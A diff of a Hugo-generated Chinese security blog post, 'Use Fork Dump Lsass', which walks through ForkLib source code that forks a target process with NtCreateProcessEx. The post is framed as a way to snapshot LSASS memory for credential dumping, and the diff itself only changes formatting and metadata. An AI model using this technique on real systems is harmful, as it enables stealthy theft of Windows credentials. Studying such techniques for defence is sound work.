@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="generator" content="Hugo 0.88.1" />
+  <meta name="generator" content="Hugo 0.100.1" />
 
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -21,7 +21,7 @@
       "articleSection" : "posts",
       "name" : "Use Fork Dump Lsass",
       "headline" : "Use Fork Dump Lsass",
-      "description" : "前言 这个东西在我还在学校的时候，就出来了，但是我一直没记录；这下寒假快结束了 我才写分析\u0026hellip;.\n原理可以看下上面参考链接的第一个，我主要写了下源码分析，如何实现的。\n就是用了NtCreateProcess(Ex)来fork进程\n参考链接 https:\/\/billdemirkapi.me\/abusing-windows-implementation-of-fork-for-stealthy-memory-operations\/\nhttps:\/\/github.com\/D4stiny\/ForkPlayground\n源码分析 ForkLib 先分析ForkLib文件夹下的内容\nForkLib.cpp引用了\n#include \u0026#34;pch.h\u0026#34;#include \u0026#34;ForkLib.h\u0026#34;先看pch头文件 定义了一个PCH_H 宏，引用了framework.h头文件\n#pragma once #include \u0026lt;Windows.h\u0026gt;#include \u0026lt;winternl.h\u0026gt; #define RCAST reinterpret_cast #define SCAST static_cast #define CCAST const_cast  #ifdef _DEBUG #include \u0026lt;cstdio\u0026gt;#define DBGPRINT(msg, ...) printf(msg\u0026#34;\\\\n\u0026#34;, __VA_ARGS__) #else #define DBGPRINT(x, ...) #endif  #define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004  #pragma comment(lib, \u0026#34;ntdll.lib\u0026#34;)  extern \u0026#34;C\u0026#34; { NTSYSCALLAPI NTSTATUS NTAPI NtCreateProcessEx ( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ParentProcess, _In_ ULONG Flags, _In_opt_ HANDLE SectionHandle, _In_opt_ HANDLE DebugPort, _In_opt_ HANDLE ExceptionPort, _In_ ULONG JobMemberLevel ); } 开头他是定义了几个宏，我把对应是上面东西 都写一下",
+      "description" : "前言 这个东西在我还在学校的时候，就出来了，但是我一直没记录；这下寒假快结束了 我才写分析\u0026hellip;.\n原理可以看下上面参考链接的第一个，我主要写了下源码分析，如何实现的。\n就是用了NtCreateProcess(Ex)来fork进程\n参考链接 https:\/\/billdemirkapi.me\/abusing-windows-implementation-of-fork-for-stealthy-memory-operations\/\nhttps:\/\/github.com\/D4stiny\/ForkPlayground\n源码分析 ForkLib 先分析ForkLib文件夹下的内容\nForkLib.cpp引用了\n#include \u0026#34;pch.h\u0026#34; #include \u0026#34;ForkLib.h\u0026#34; 先看pch头文件 定义了一个PCH_H 宏，引用了framework.h头文件\n#pragma once #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #define RCAST reinterpret_cast #define SCAST static_cast #define CCAST const_cast #ifdef _DEBUG #include \u0026lt;cstdio\u0026gt; #define DBGPRINT(msg, ...) printf(msg\u0026#34;\\\\n\u0026#34;, __VA_ARGS__) #else #define DBGPRINT(x, ...) #endif #define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004 #pragma comment(lib, \u0026#34;ntdll.lib\u0026#34;) extern \u0026#34;C\u0026#34; { NTSYSCALLAPI NTSTATUS NTAPI NtCreateProcessEx ( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ParentProcess, _In_ ULONG Flags, _In_opt_ HANDLE SectionHandle, _In_opt_ HANDLE DebugPort, _In_opt_ HANDLE ExceptionPort, _In_ ULONG JobMemberLevel ); } 开头他是定义了几个宏，我把对应是上面东西 都写一下",
       "inLanguage" : "en-US",
       "author" : "Muxue",
       "creator" : "Muxue",
@@ -45,8 +45,8 @@
 https://github.com/D4stiny/ForkPlayground
 源码分析 ForkLib 先分析ForkLib文件夹下的内容
 ForkLib.cpp引用了
-#include &amp;#34;pch.h&amp;#34;#include &amp;#34;ForkLib.h&amp;#34;先看pch头文件 定义了一个PCH_H 宏，引用了framework.h头文件
-#pragma once #include &amp;lt;Windows.h&amp;gt;#include &amp;lt;winternl.h&amp;gt; #define RCAST reinterpret_cast #define SCAST static_cast #define CCAST const_cast  #ifdef _DEBUG #include &amp;lt;cstdio&amp;gt;#define DBGPRINT(msg, ...) printf(msg&amp;#34;\\n&amp;#34;, __VA_ARGS__) #else #define DBGPRINT(x, ...) #endif  #define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004  #pragma comment(lib, &amp;#34;ntdll.lib&amp;#34;)  extern &amp;#34;C&amp;#34; { NTSYSCALLAPI NTSTATUS NTAPI NtCreateProcessEx ( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ParentProcess, _In_ ULONG Flags, _In_opt_ HANDLE SectionHandle, _In_opt_ HANDLE DebugPort, _In_opt_ HANDLE ExceptionPort, _In_ ULONG JobMemberLevel ); } 开头他是定义了几个宏，我把对应是上面东西 都写一下" />
+#include &amp;#34;pch.h&amp;#34; #include &amp;#34;ForkLib.h&amp;#34; 先看pch头文件 定义了一个PCH_H 宏，引用了framework.h头文件
+#pragma once #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;winternl.h&amp;gt; #define RCAST reinterpret_cast #define SCAST static_cast #define CCAST const_cast #ifdef _DEBUG #include &amp;lt;cstdio&amp;gt; #define DBGPRINT(msg, ...) printf(msg&amp;#34;\\n&amp;#34;, __VA_ARGS__) #else #define DBGPRINT(x, ...) #endif #define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004 #pragma comment(lib, &amp;#34;ntdll.lib&amp;#34;) extern &amp;#34;C&amp;#34; { NTSYSCALLAPI NTSTATUS NTAPI NtCreateProcessEx ( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ParentProcess, _In_ ULONG Flags, _In_opt_ HANDLE SectionHandle, _In_opt_ HANDLE DebugPort, _In_opt_ HANDLE ExceptionPort, _In_ ULONG JobMemberLevel ); } 开头他是定义了几个宏，我把对应是上面东西 都写一下" />
   <meta name="description" content="前言 这个东西在我还在学校的时候，就出来了，但是我一直没记录；这下寒假快结束了 我才写分析&amp;hellip;.
 原理可以看下上面参考链接的第一个，我主要写了下源码分析，如何实现的。
 就是用了NtCreateProcess(Ex)来fork进程
@@ -54,8 +54,8 @@ ForkLib.cpp引用了
 https://github.com/D4stiny/ForkPlayground
 源码分析 ForkLib 先分析ForkLib文件夹下的内容
 ForkLib.cpp引用了
-#include &amp;#34;pch.h&amp;#34;#include &amp;#34;ForkLib.h&amp;#34;先看pch头文件 定义了一个PCH_H 宏，引用了framework.h头文件
-#pragma once #include &amp;lt;Windows.h&amp;gt;#include &amp;lt;winternl.h&amp;gt; #define RCAST reinterpret_cast #define SCAST static_cast #define CCAST const_cast  #ifdef _DEBUG #include &amp;lt;cstdio&amp;gt;#define DBGPRINT(msg, ...) printf(msg&amp;#34;\\n&amp;#34;, __VA_ARGS__) #else #define DBGPRINT(x, ...) #endif  #define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004  #pragma comment(lib, &amp;#34;ntdll.lib&amp;#34;)  extern &amp;#34;C&amp;#34; { NTSYSCALLAPI NTSTATUS NTAPI NtCreateProcessEx ( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ParentProcess, _In_ ULONG Flags, _In_opt_ HANDLE SectionHandle, _In_opt_ HANDLE DebugPort, _In_opt_ HANDLE ExceptionPort, _In_ ULONG JobMemberLevel ); } 开头他是定义了几个宏，我把对应是上面东西 都写一下" />
+#include &amp;#34;pch.h&amp;#34; #include &amp;#34;ForkLib.h&amp;#34; 先看pch头文件 定义了一个PCH_H 宏，引用了framework.h头文件
+#pragma once #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;winternl.h&amp;gt; #define RCAST reinterpret_cast #define SCAST static_cast #define CCAST const_cast #ifdef _DEBUG #include &amp;lt;cstdio&amp;gt; #define DBGPRINT(msg, ...) printf(msg&amp;#34;\\n&amp;#34;, __VA_ARGS__) #else #define DBGPRINT(x, ...) #endif #define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004 #pragma comment(lib, &amp;#34;ntdll.lib&amp;#34;) extern &amp;#34;C&amp;#34; { NTSYSCALLAPI NTSTATUS NTAPI NtCreateProcessEx ( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ParentProcess, _In_ ULONG Flags, _In_opt_ HANDLE SectionHandle, _In_opt_ HANDLE DebugPort, _In_opt_ HANDLE ExceptionPort, _In_ ULONG JobMemberLevel ); } 开头他是定义了几个宏，我把对应是上面东西 都写一下" />
   <meta property="og:locale" content="en-us" />
 
   
@@ -125,7 +125,7 @@ ForkLib.cpp引用了
             <div class="col-xs-6">
               
               <div class="post-author">
-                <a target="_blank" href="https://github.com/muxue">@Muxue</a>
+                <a target="_blank" href="https://github.com/secxue">@Muxue</a>
               </div>
               
             </div>
@@ -146,443 +146,443 @@ ForkLib.cpp引用了
 <h3 id="forklib">ForkLib</h3>
 <p>先分析ForkLib文件夹下的内容</p>
 <p><code>ForkLib.cpp</code>引用了</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;ForkLib.h&#34;</span><span style="color:#75715e">
-</span></code></pre></div><p>先看pch头文件 定义了一个<code>PCH_H</code> 宏，引用了framework.h头文件</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#pragma once
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#define RCAST reinterpret_cast
-</span><span style="color:#75715e">#define SCAST static_cast
-</span><span style="color:#75715e">#define CCAST const_cast
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#ifdef _DEBUG
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#define DBGPRINT(msg, ...) printf(msg&#34;\\n&#34;, __VA_ARGS__)
-</span><span style="color:#75715e">#else
-</span><span style="color:#75715e">#define DBGPRINT(x, ...)
-</span><span style="color:#75715e">#endif
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#pragma comment(lib, &#34;ntdll.lib&#34;)
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span>
-{
-    NTSYSCALLAPI
-    NTSTATUS
-    NTAPI
-    <span style="color:#a6e22e">NtCreateProcessEx</span> (
-        _Out_ PHANDLE ProcessHandle,
-        _In_ ACCESS_MASK DesiredAccess,
-        _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
-        _In_ HANDLE ParentProcess,
-        _In_ ULONG Flags,
-        _In_opt_ HANDLE SectionHandle,
-        _In_opt_ HANDLE DebugPort,
-        _In_opt_ HANDLE ExceptionPort,
-        _In_ ULONG JobMemberLevel
-        );
-}
-</code></pre></div><p>开头他是定义了几个宏，我把对应是上面东西 都写一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">reinterpret_cast</span><span style="color:#960050;background-color:#1e0010">：允许将任何指针转换为任何其他指针类型。</span>
-<span style="color:#66d9ef">static_cast</span><span style="color:#960050;background-color:#1e0010">：将表达式转换为</span> type<span style="color:#f92672">-</span>id <span style="color:#960050;background-color:#1e0010">的类型。</span>
-<span style="color:#66d9ef">const_cast</span><span style="color:#960050;background-color:#1e0010">：是用来移除变量的</span>const或volatile限定符
-</code></pre></div><p>然后又定义了Debug的打印输出信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;ForkLib.h&#34;</span><span style="color:#75715e">
+</span></span></span></code></pre></div><p>先看pch头文件 定义了一个<code>PCH_H</code> 宏，引用了framework.h头文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#pragma once
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define RCAST reinterpret_cast
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SCAST static_cast
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CCAST const_cast
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef _DEBUG
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DBGPRINT(msg, ...) printf(msg&#34;\\n&#34;, __VA_ARGS__)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DBGPRINT(x, ...)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib, &#34;ntdll.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    NTSYSCALLAPI
+</span></span><span style="display:flex;"><span>    NTSTATUS
+</span></span><span style="display:flex;"><span>    NTAPI
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">NtCreateProcessEx</span> (
+</span></span><span style="display:flex;"><span>        _Out_ PHANDLE ProcessHandle,
+</span></span><span style="display:flex;"><span>        _In_ ACCESS_MASK DesiredAccess,
+</span></span><span style="display:flex;"><span>        _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+</span></span><span style="display:flex;"><span>        _In_ HANDLE ParentProcess,
+</span></span><span style="display:flex;"><span>        _In_ ULONG Flags,
+</span></span><span style="display:flex;"><span>        _In_opt_ HANDLE SectionHandle,
+</span></span><span style="display:flex;"><span>        _In_opt_ HANDLE DebugPort,
+</span></span><span style="display:flex;"><span>        _In_opt_ HANDLE ExceptionPort,
+</span></span><span style="display:flex;"><span>        _In_ ULONG JobMemberLevel
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>开头他是定义了几个宏，我把对应是上面东西 都写一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">reinterpret_cast</span><span style="color:#960050;background-color:#1e0010">：允许将任何指针转换为任何其他指针类型。</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static_cast</span><span style="color:#960050;background-color:#1e0010">：将表达式转换为</span> type<span style="color:#f92672">-</span>id <span style="color:#960050;background-color:#1e0010">的类型。</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const_cast</span><span style="color:#960050;background-color:#1e0010">：是用来移除变量的</span>const或volatile限定符
+</span></span></code></pre></div><p>然后又定义了Debug的打印输出信息</p>
 <p>然后接下来的这句是<code>NtCreateProcessEx</code> 的标志</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004
-</span></code></pre></div><p>最后导入了<code>ntdll.lib</code>和创建了<code>NtCreateProcessEx</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004
+</span></span></span></code></pre></div><p>最后导入了<code>ntdll.lib</code>和创建了<code>NtCreateProcessEx</code></p>
 <p>接着回到<code>ForkLib.cpp</code>发现又引入了ForkLib头文件</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">/*
-</span><span style="color:#75715e"> * FORKLIB - Process Snapshotting via forking.
-</span><span style="color:#75715e"> *
-</span><span style="color:#75715e"> * This file is subject to the terms and conditions defined in
-</span><span style="color:#75715e"> * file &#39;LICENSE&#39;, which is part of this source code package.
-</span><span style="color:#75715e"> *
-</span><span style="color:#75715e"> * COPYRIGHT Bill Demirkapi 2021
-</span><span style="color:#75715e"> */</span>
-<span style="color:#75715e">#pragma once
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ForkSnapshot</span>
-{
-	<span style="color:#75715e">/// &lt;summary&gt;
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">/// A handle to the target process we&#39;re forking. This handle should hold the PROCESS_CREATE_PROCESS right.
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">/// &lt;/summary&gt;
-</span><span style="color:#75715e"></span>	HANDLE TargetProcess;
-	<span style="color:#75715e">/// &lt;summary&gt;
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">/// Handle to the current snapshot process.
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">/// &lt;/summary&gt;
-</span><span style="color:#75715e"></span>	HANDLE CurrentSnapshotProcess;
-<span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
-	ForkSnapshot (
-		_In_ HANDLE TargetProcess
-		);
-	ForkSnapshot (
-		_In_ DWORD TargetProcessId
-		);
-	<span style="color:#f92672">~</span>ForkSnapshot (
-		VOID
-		);
-
-	HANDLE <span style="color:#a6e22e">TakeSnapshot</span> (
-		VOID
-		);
-	BOOL <span style="color:#a6e22e">CleanSnapshot</span> (
-		VOID
-		);
-};
-</code></pre></div><p>定义了一个<code>ForkSnapshot</code>类，里面定义了俩句柄，然后构造 析构 函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * FORKLIB - Process Snapshotting via forking.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * This file is subject to the terms and conditions defined in
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * file &#39;LICENSE&#39;, which is part of this source code package.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * COPYRIGHT Bill Demirkapi 2021
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma once
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ForkSnapshot</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/// &lt;summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/// A handle to the target process we&#39;re forking. This handle should hold the PROCESS_CREATE_PROCESS right.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/// &lt;/summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HANDLE TargetProcess;
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/// &lt;summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/// Handle to the current snapshot process.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/// &lt;/summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HANDLE CurrentSnapshotProcess;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>	ForkSnapshot (
+</span></span><span style="display:flex;"><span>		_In_ HANDLE TargetProcess
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>	ForkSnapshot (
+</span></span><span style="display:flex;"><span>		_In_ DWORD TargetProcessId
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">~</span>ForkSnapshot (
+</span></span><span style="display:flex;"><span>		VOID
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE <span style="color:#a6e22e">TakeSnapshot</span> (
+</span></span><span style="display:flex;"><span>		VOID
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>	BOOL <span style="color:#a6e22e">CleanSnapshot</span> (
+</span></span><span style="display:flex;"><span>		VOID
+</span></span><span style="display:flex;"><span>		);
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>定义了一个<code>ForkSnapshot</code>类，里面定义了俩句柄，然后构造 析构 函数</p>
 <p>接着回到主文件的cpp看，</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">/*
-</span><span style="color:#75715e"> * FORKLIB - Process Snapshotting via forking.
-</span><span style="color:#75715e"> *
-</span><span style="color:#75715e"> * This file is subject to the terms and conditions defined in
-</span><span style="color:#75715e"> * file &#39;LICENSE&#39;, which is part of this source code package.
-</span><span style="color:#75715e"> *
-</span><span style="color:#75715e"> * COPYRIGHT Bill Demirkapi 2021
-</span><span style="color:#75715e"> */</span>
-<span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;ForkLib.h&#34;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">/// &lt;summary&gt;
-</span><span style="color:#75715e">/// Initialize a fork snapshot. Attempts to open a PROCESS_CREATE_PROCESS handle to the target.
-</span><span style="color:#75715e">/// &lt;/summary&gt;
-</span><span style="color:#75715e">/// &lt;param name=&#34;TargetProcessId&#34;&gt;The process ID of the target process to fork.&lt;/param&gt;
-</span><span style="color:#75715e"></span>ForkSnapshot<span style="color:#f92672">::</span>ForkSnapshot (
-	_In_ DWORD TargetProcessId
-	)
-{
-	<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess <span style="color:#f92672">=</span> NULL;
-	<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>TargetProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_CREATE_PROCESS, FALSE, TargetProcessId);
-	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>TargetProcess <span style="color:#f92672">==</span> NULL)
-	{
-		DBGPRINT(<span style="color:#e6db74">&#34;[FORKLIB] Failed to open a PROCESS_CREATE_PROCESS handle to target process %i with last error %i.&#34;</span>, TargetProcessId, GetLastError());
-	}
-}
-
-<span style="color:#75715e">/// &lt;summary&gt;
-</span><span style="color:#75715e">/// Initialize a fork snapshot.
-</span><span style="color:#75715e">/// &lt;/summary&gt;
-</span><span style="color:#75715e">/// &lt;param name=&#34;TargetProcess&#34;&gt;The process ID of the target process to fork.&lt;/param&gt;
-</span><span style="color:#75715e"></span>ForkSnapshot<span style="color:#f92672">::</span>ForkSnapshot (
-	_In_ HANDLE TargetProcess
-	)
-{
-	<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess <span style="color:#f92672">=</span> NULL;
-	<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>TargetProcess <span style="color:#f92672">=</span> TargetProcess;
-}
-
-<span style="color:#75715e">/// &lt;summary&gt;
-</span><span style="color:#75715e">/// Deconstruct a fork snapshot. This will clean up any open snapshots.
-</span><span style="color:#75715e">/// &lt;/summary&gt;
-</span><span style="color:#75715e"></span>ForkSnapshot<span style="color:#f92672">::~</span>ForkSnapshot (
-	VOID
-	)
-{
-	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess <span style="color:#f92672">!=</span> NULL)
-	{
-		<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CleanSnapshot();
-	}
-}
-
-<span style="color:#75715e">/// &lt;summary&gt;
-</span><span style="color:#75715e">/// Take a snapshot of the target process.
-</span><span style="color:#75715e">/// &lt;/summary&gt;
-</span><span style="color:#75715e">/// &lt;returns&gt;A PROCESS_ALL_ACCESS HANDLE to a snapshot of the target process.&lt;/returns&gt;
-</span><span style="color:#75715e"></span>HANDLE
-ForkSnapshot<span style="color:#f92672">::</span>TakeSnapshot (
-	VOID
-	)
-{
-	NTSTATUS status;
-
-	<span style="color:#75715e">//
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">// If we have an existing snapshot process, we need to clean it up before creating another one.
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">//
-</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess <span style="color:#f92672">!=</span> NULL)
-	{
-		<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CleanSnapshot() <span style="color:#f92672">==</span> FALSE)
-		{
-			DBGPRINT(<span style="color:#e6db74">&#34;[FORKLIB] Failed to clean up existing snapshot before taking another one.&#34;</span>);
-			<span style="color:#66d9ef">return</span> NULL;
-		}
-	}
-
-	<span style="color:#75715e">//
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">// Attempt to create a fork of the target process.
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">//
-</span><span style="color:#75715e"></span>	status <span style="color:#f92672">=</span> NtCreateProcessEx(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess,
-							   PROCESS_ALL_ACCESS,
-							   NULL,
-							   <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>TargetProcess,
-							   <span style="color:#ae81ff">0</span>,
-							   NULL,
-							   NULL,
-							   NULL,
-							   <span style="color:#ae81ff">0</span>);
-	<span style="color:#66d9ef">if</span> (NT_SUCCESS(status) <span style="color:#f92672">==</span> FALSE)
-	{
-		DBGPRINT(<span style="color:#e6db74">&#34;[FORKLIB] Failed to create fork process with status 0x%X.&#34;</span>, status);
-		<span style="color:#66d9ef">return</span> NULL;
-	}
-
-	<span style="color:#75715e">//
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">// If the previous call succeeded, we have created a fork/snapshot of the target process.
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">// Yes, it really is that simple.
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">//
